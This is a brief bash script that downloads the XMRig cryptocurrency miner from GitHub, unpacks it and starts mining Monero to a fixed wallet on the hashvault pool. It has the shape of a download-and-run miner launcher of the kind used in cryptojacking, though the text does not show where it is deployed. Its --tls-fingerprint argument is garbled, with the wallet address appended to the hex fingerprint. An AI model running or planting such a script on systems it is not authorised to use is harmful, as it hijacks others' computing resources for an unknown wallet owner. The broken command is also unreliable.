#!/bin/bash
curl -LOJ https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz
tar -zxvf xmrig-6.19.2-linux-static-x64.tar.gz
cd xmrig-6.19.2
./xmrig --url pool.hashvault.pro:80 --user 454iEHPcqfzES8GqwFopzq1H2aTc7mtE5F5xXWnW8MbNd2DsM1nFa2m4FEi2S3fijMMN4B54Dyrb61HDEJdXtGXPUVKyH7L --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14454iEHPcqfzES8GqwFopzq1H2aTc7mtE5F5xXWnW8MbNd2DsM1nFa2m4FEi2S3fijMMN4B54Dyrb61HDEJdXtGXPUVKyH7L